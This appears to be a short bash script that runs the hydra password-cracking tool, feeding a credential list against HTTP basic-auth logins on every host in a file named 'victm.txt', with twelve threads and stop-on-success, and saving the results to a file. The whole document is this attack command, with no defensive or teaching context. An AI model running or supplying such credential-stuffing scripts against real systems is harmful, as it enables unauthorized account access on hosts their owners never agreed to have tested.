#!/bin/bash

hydra -C cred_list.txt -t 12 -f -vV -M victm.txt http-get | tee checkthisfile.txt
